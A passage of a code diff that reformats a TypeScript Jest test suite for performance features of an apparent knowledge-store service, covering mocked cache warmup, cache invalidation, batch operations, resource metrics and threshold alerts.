 
       mockPerformanceMonitor.checkCache
@@ -1550,25 +1564,23 @@ describe('Performance and Optimization', () => {
       const warmupQueries = [
         { query: 'authentication', types: ['entity'] },
         { query: 'database decisions', types: ['decision'] },
-        { query: 'performance issues', types: ['issue', 'observation'] }
+        { query: 'performance issues', types: ['issue', 'observation'] },
       ];
 
-      mockPerformanceMonitor.warmupCache.mockImplementation(
-        async (queries: any[]) => {
-          const results = [];
-          for (const query of queries) {
-            // Simulate cache warming
-            await new Promise(resolve => setTimeout(resolve, 10));
-            results.push({
-              query,
-              cacheKey: `warmup:${query.query}:${query.types?.join(',')}`,
-              warmed: true,
-              estimatedHitRate: 0.8
-            });
-          }
-          return results;
+      mockPerformanceMonitor.warmupCache.mockImplementation(async (queries: any[]) => {
+        const results = [];
+        for (const query of queries) {
+          // Simulate cache warming
+          await new Promise((resolve) => setTimeout(resolve, 10));
+          results.push({
+            query,
+            cacheKey: `warmup:${query.query}:${query.types?.join(',')}`,
+            warmed: true,
+            estimatedHitRate: 0.8,
+          });
         }
-      );
+        return results;
+      });
 
       const warmupResults = await mockPerformanceMonitor.warmupCache(warmupQueries);
 
@@ -1583,18 +1595,18 @@ describe('Performance and Optimization', () => {
         {
           trigger: 'knowledge_update',
           item: { id: 'entity-123', kind: 'entity' },
-          invalidationKeys: ['entity:123', 'project:test:entities', 'search:entity:*']
+          invalidationKeys: ['entity:123', 'project:test:entities', 'search:entity:*'],
         },
         {
           trigger: 'schema_change',
           item: { type: 'field_addition', field: 'priority' },
-          invalidationKeys: ['schema:*', 'search:*', 'filters:*']
+          invalidationKeys: ['schema:*', 'search:*', 'filters:*'],
         },
         {
           trigger: 'bulk_import',
           item: { count: 1000, project: 'migration-project' },
-          invalidationKeys: ['project:migration-project:*', 'search:*', 'cache:stats']
-        }
+          invalidationKeys: ['project:migration-project:*', 'search:*', 'cache:stats'],
+        },
       ];
 
       mockPerformanceMonitor.invalidateCache.mockImplementation(
@@ -1603,7 +1615,7 @@ describe('Performance and Optimization', () => {
             trigger,
             keysInvalidated: keys.length,
             cacheCleared: keys.length > 50, // Bulk invalidation
-            duration: Math.random() * 100 + 10
+            duration: Math.random() * 100 + 10,
           };
         }
       );
@@ -1628,8 +1640,8 @@ describe('Performance and Optimization', () => {
         data: {
           ...validMemoryStoreItem.data,
           title: `Entity ${i + 1}`,
-          batchId: 'batch-001'
-        }
+          batchId: 'batch-001',
+        },
       }));
 
       const batchResult: MemoryStoreResponse = {
@@ -1643,9 +1655,9 @@ describe('Performance and Optimization', () => {
             processingTime: 1250,
             throughput: 40, // items per second
             parallelization: true,
-            workerCount: 4
-          }
-        }
+            workerCount: 4,
+          },
+        },
       };
 
       mockMemoryStore.store.mockResolvedValue(batchResult);
@@ -1663,14 +1675,14 @@ describe('Performance and Optimization', () => {
         queries: [
           { query: 'user service', types: ['entity'] },
           { query: 'auth decisions', types: ['decision'] },
-          { query: 'performance issues', types: ['issue'] }
+          { query: 'performance issues', types: ['issue'] },
         ],
         pagination: {
           pageSize: 20,
           currentPage: 1,
           sortBy: 'relevance',
-          sortOrder: 'desc'
-        }
+          sortOrder: 'desc',
+        },
       };
 
       const batchFindResults = {
@@ -1679,20 +1691,20 @@ describe('Performance and Optimization', () => {
             items: [mockKnowledgeItems[0]],
             total: 1,
             page: 1,
-            totalPages: 1
+            totalPages: 1,
           },
           'auth decisions': {
             items: [mockKnowledgeItems[1]],
             total: 1,
             page: 1,
-            totalPages: 1
+            totalPages: 1,
           },
           'performance issues': {
             items: [],
             total: 0,
             page: 1,
-            totalPages: 0
-          }
+            totalPages: 0,
+          },
         },
         metadata: {
           batchExecution: {
@@ -1700,9 +1712,9 @@ describe('Performance and Optimization', () => {
             totalItems: 2,
             executionTime: 180,
             parallelExecution: true,
-            cacheHits: 1
-          }
-        }
+            cacheHits: 1,
+          },
+        },
       };
 
       mockMemoryStore.batchFind.mockResolvedValue(batchFindResults);
@@ -1722,27 +1734,27 @@ describe('Performance and Optimization', () => {
         cpu: {
           usage: 45.2,
           cores: 8,
-          loadAverage: [2.1, 2.3, 2.0]
+          loadAverage: [2.1, 2.3, 2.0],
         },
         memory: {
           used: 2048576000, // 2GB
           total: 8589934592, // 8GB
           percentage: 23.8,
           heapUsed: 512000000, // 512MB
-          heapTotal: 1073741824 // 1GB
+          heapTotal: 1073741824, // 1GB
         },
         disk: {
           readOps: 150,
           writeOps: 75,
           readBytes: 10485760, // 10MB
-          writeBytes: 5242880 // 5MB
+          writeBytes: 5242880, // 5MB
         },
         network: {
           requestsIn: 25,
           requestsOut: 18,
           bytesIn: 1048576, // 1MB
-          bytesOut: 524288 // 512KB
-        }
+          bytesOut: 524288, // 512KB
+        },
       };
 
       mockPerformanceMonitor.getResourceMetrics.mockResolvedValue(resourceMetrics);
@@ -1760,14 +1772,14 @@ describe('Performance and Optimization', () => {
         cpu: { warning: 70, critical: 90 },
         memory: { warning: 80, critical: 95 },
         responseTime: { warning: 1000, critical: 3000 },
-        errorRate: { warning: 0.05, critical: 0.10 }
+        errorRate: { warning: 0.05, critical: 0.1 },
       };
 
       const currentMetrics = {
         cpu: 85.3,
         memory: 92.1,
         responseTime: 2500,
-        errorRate: 0.08
+        errorRate: 0.08,
       };
 
       mockPerformanceMonitor.checkThresholds.mockImplementation(
@@ -1775,22 +1787,45 @@ describe('Performance and Optimization', () => {
           const alerts = [];
 
           if (metrics.cpu > thresholdConfig.cpu.critical) {
-            alerts.push({ type: 'critical', metric: 'cpu', value: metrics.cpu, threshold: thresholdConfig.cpu.critical });
+            alerts.push({
+              type: 'critical',
+              metric: 'cpu',
+              value: metrics.cpu,
+              threshold: thresholdConfig.cpu.critical,
+            });
           } else if (metrics.cpu > thresholdConfig.cpu.warning) {
-            alerts.push({ type: 'warning', metric: 'cpu', value: metrics.cpu, threshold: thresholdConfig.cpu.warning });
+            alerts.push({
+              type: 'warning',
+              metric: 'cpu',
+              value: metrics.cpu,
+              threshold: thresholdConfig.cpu.warning,
+            });
           }
 
           if (metrics.memory > thresholdConfig.memory.critical) {
-            alerts.push({ type: 'critical', metric: 'memory', value: metrics.memory, threshold: thresholdConfig.memory.critical });
+            alerts.push({
+              type: 'critical',
+              metric: 'memory',
+              value: metrics.memory,
+              threshold: thresholdConfig.memory.critical,
+            });
           } else if (metrics.memory > thresholdConfig.memory.warning) {
-            alerts.push({ type: 'warning', metric: 'memory', value: metrics.memory, threshold: thresholdConfig.memory.warning });
+            alerts.push({
+              type: 'warning',
+              metric: 'memory',
+              value: metrics.memory,
+              threshold: thresholdConfig.memory.warning,
+            });
           }
 
           return {
             alerts,
-            status: alerts.some(a => a.type === 'critical') ? 'critical' :
-                    alerts.some(a => a.type === 'warning') ? 'warning' : 'healthy',
-            timestamp: new Date().toISOString()
+            status: alerts.some((a) => a.type === 'critical')
+              ? 'critical'
+              : alerts.some((a) => a.type === 'warning')
+                ? 'warning'
+                : 'healthy',
+            timestamp: new Date().toISOString(),
           };
         }
       );
@@ -1799,8 +1834,10 @@ describe('Performance and Optimization', () => {
 
       expect(alertResult.status).toBe('critical');
       expect(alertResult.alerts).toHaveLength(2);
-      expect(alertResult.alerts.some(a => a.metric === 'cpu' && a.type === 'warning')).toBe(true);
-      expect(alertResult.alerts.some(a => a.metric === 'memory' && a.type === 'critical')).toBe(true);
+      expect(alertResult.alerts.some((a) => a.metric === 'cpu' && a.type === 'warning')).toBe(true);
+      expect(alertResult.alerts.some((a) => a.metric === 'memory' && a.type === 'critical')).toBe(
+        true
+      );
     });
   });
 });
